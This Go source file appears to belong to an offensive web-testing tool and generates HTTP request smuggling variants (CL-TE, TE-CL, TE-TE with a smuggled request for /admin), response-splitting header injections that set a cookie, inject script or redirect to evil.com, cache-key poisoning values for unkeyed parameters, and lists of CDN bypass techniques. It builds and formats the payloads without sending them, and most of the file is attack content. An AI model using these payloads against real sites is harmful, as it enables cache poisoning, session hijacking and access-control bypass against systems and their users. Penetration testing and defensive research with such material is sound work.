package cachesmuggle

import (
	"fmt"
	"strings"
	"sync"
	"time"
)

type Engine struct {
	config CacheSmuggleConfig
	mu     sync.Mutex
}

func NewEngine(cfg CacheSmuggleConfig) *Engine {
	return &Engine{
		config: cfg,
	}
}

func (e *Engine) RequestSmuggle(targetURL string) (*CacheSmuggleResult, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	variants := e.generateSmuggleVariants(targetURL)

	return &CacheSmuggleResult{
		Success:  true,
		Method:   "Request_Smuggle",
		Message:  fmt.Sprintf("Generated %d request smuggling variants for %s", len(variants), targetURL),
		Duration: time.Since(start),
		Payload:  e.formatVariants(variants),
		Risk:     "critical",
	}, nil
}

func (e *Engine) generateSmuggleVariants(targetURL string) []RequestSmuggleResult {
	variants := make([]RequestSmuggleResult, 0)

	variants = append(variants, RequestSmuggleResult{
		Variant: "CL-TE",
		CLValue: "6",
		TEValue: "chunked",
		Payload: "0\r\n\r\nG",
	})

	variants = append(variants, RequestSmuggleResult{
		Variant: "TE-CL",
		CLValue: "0",
		TEValue: "chunked",
		Payload: "0\r\n\r\nSMUGGLED",
	})

	variants = append(variants, RequestSmuggleResult{
		Variant: "TE-TE",
		CLValue: "0",
		TEValue: "chunked, identity",
		Payload: "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n",
	})

	variants = append(variants, RequestSmuggleResult{
		Variant: "H2.CL",
		CLValue: "0",
		TEValue: "",
		Payload: "Padding",
	})

	return variants
}

func (e *Engine) formatVariants(variants []RequestSmuggleResult) string {
	var result strings.Builder
	for i, v := range variants {
		result.WriteString(fmt.Sprintf("[%d] %s:\n", i+1, v.Variant))
		result.WriteString(fmt.Sprintf("    CL: %s, TE: %s\n", v.CLValue, v.TEValue))
		result.WriteString(fmt.Sprintf("    Payload: %s\n\n", v.Payload))
	}
	return result.String()
}

func (e *Engine) ResponseSplit(targetURL string) (*CacheSmuggleResult, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	splits := e.generateResponseSplits(targetURL)

	return &CacheSmuggleResult{
		Success:  true,
		Method:   "Response_Split",
		Message:  fmt.Sprintf("Generated %d response splitting payloads", len(splits)),
		Duration: time.Since(start),
		Payload:  e.formatSplits(splits),
		Risk:     "high",
	}, nil
}

func (e *Engine) generateResponseSplits(targetURL string) []ResponseSplitResult {
	splits := make([]ResponseSplitResult, 0)

	splits = append(splits, ResponseSplitResult{
		Header:      "Set-Cookie: session=evil\r\n\r\n<script>alert(1)</script>",
		Body:        "<script>alert(1)</script>",
		CacheBuster: false,
	})

	splits = append(splits, ResponseSplitResult{
		Header:      "X-Injected: true\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK",
		Body:        "",
		CacheBuster: true,
	})

	splits = append(splits, ResponseSplitResult{
		Header:      "\r\n\r\nHTTP/1.1 302 Found\r\nLocation: http://evil.com",
		Body:        "",
		CacheBuster: false,
	})

	return splits
}

func (e *Engine) formatSplits(splits []ResponseSplitResult) string {
	var result strings.Builder
	for i, s := range splits {
		result.WriteString(fmt.Sprintf("[%d] Header Split:\n", i+1))
		result.WriteString(fmt.Sprintf("    %s\n", s.Header))
		result.WriteString(fmt.Sprintf("    CacheBuster: %v\n\n", s.CacheBuster))
	}
	return result.String()
}

func (e *Engine) CacheKeyPoison(targetURL string) (*CacheSmuggleResult, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	poisons := e.analyzeCacheKeyPoisoning(targetURL)

	return &CacheSmuggleResult{
		Success:  true,
		Method:   "Cache_Key_Poison",
		Message:  fmt.Sprintf("Found %d cache key poisoning vectors", len(poisons)),
		Duration: time.Since(start),
		Payload:  e.formatPoisons(poisons),
		Risk:     "high",
	}, nil
}

func (e *Engine) analyzeCacheKeyPoisoning(targetURL string) []CacheKeyPoisonResult {
	poisons := make([]CacheKeyPoisonResult, 0)

	unkeyedParams := []string{
		"utm_source",
		"utm_medium",
		"utm_campaign",
		"ref",
		"referer",
		"callback",
		"json",
	}

	for _, param := range unkeyedParams {
		poisons = append(poisons, CacheKeyPoisonResult{
			Key:          targetURL,
			Value:        fmt.Sprintf("?%s=evil", param),
			UnkeyedParam: param,
			Affected:     true,
		})
	}

	return poisons
}

func (e *Engine) formatPoisons(poisons []CacheKeyPoisonResult) string {
	var result strings.Builder
	for i, p := range poisons {
		result.WriteString(fmt.Sprintf("[%d] Unkeyed param: %s -> %s\n", i+1, p.UnkeyedParam, p.Value))
	}
	return result.String()
}

func (e *Engine) CDNAbuse(cdnType string) (*CacheSmuggleResult, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	techniques := e.getCDNAbuseTechniques(cdnType)

	return &CacheSmuggleResult{
		Success:  true,
		Method:   "CDN_Abuse",
		Message:  fmt.Sprintf("Identified %d CDN abuse techniques for %s", len(techniques), cdnType),
		Duration: time.Since(start),
		Payload:  strings.Join(techniques, "\n"),
		Risk:     "high",
	}, nil
}

func (e *Engine) getCDNAbuseTechniques(cdnType string) []string {
	techniques := make([]string, 0)

	switch strings.ToLower(cdnType) {
	case "cloudflare":
		techniques = append(techniques, "Bypass via direct IP access")
		techniques = append(techniques, "Cache poisoning via X-Forwarded-Host")
		techniques = append(techniques, "Web socket cache bypass")
		techniques = append(techniques, "Railgun decompression")

	case "akamai":
		techniques = append(techniques, "Fast purge abuse")
		techniques = append(techniques, "EdgeKV manipulation")
		techniques = append(techniques, "Bot detection bypass")
		techniques = append(techniques, "X-Akamai-Transformed header injection")

	case "cloudfront":
		techniques = append(techniques, "Lambda@Edge exploitation")
		techniques = append(techniques, "Origin header manipulation")
		techniques = append(techniques, "Custom cache key abuse")
		techniques = append(techniques, "Signed cookie bypass")

	default:
		techniques = append(techniques, "Generic CDN cache poisoning")
		techniques = append(techniques, "Cache key manipulation")
		techniques = append(techniques, "Origin header injection")
	}

	return techniques
}

func (e *Engine) AnalyzeCacheHeaders(headers map[string]string) []CacheHeader {
	result := make([]CacheHeader, 0)

	unkeyed := []string{
		"X-Forwarded-Host",
		"X-Original-URL",
		"X-Rewrite-URL",
		"X-HTTP-Method-Override",
		"X-Forwarded-Proto",
	}

	for name, value := range headers {
		isUnkeyed := false
		for _, u := range unkeyed {
			if strings.EqualFold(name, u) {
				isUnkeyed = true
				break
			}
		}
		result = append(result, CacheHeader{
			Name:    name,
			Value:   value,
			Unkeyed: isUnkeyed,
		})
	}

	return result
}

func (e *Engine) DetectCDN(headers map[string]string) string {
	for key, value := range headers {
		lower := strings.ToLower(key)
		lowerVal := strings.ToLower(value)
		if strings.Contains(lower, "cf-ray") || strings.Contains(lowerVal, "cloudflare") {
			return "Cloudflare"
		}
		if strings.Contains(lower, "x-akamai") || strings.Contains(lowerVal, "akamai") {
			return "Akamai"
		}
		if strings.Contains(lower, "x-amz-cf") || strings.Contains(lowerVal, "cloudfront") {
			return "CloudFront"
		}
	}
	return "Unknown"
}
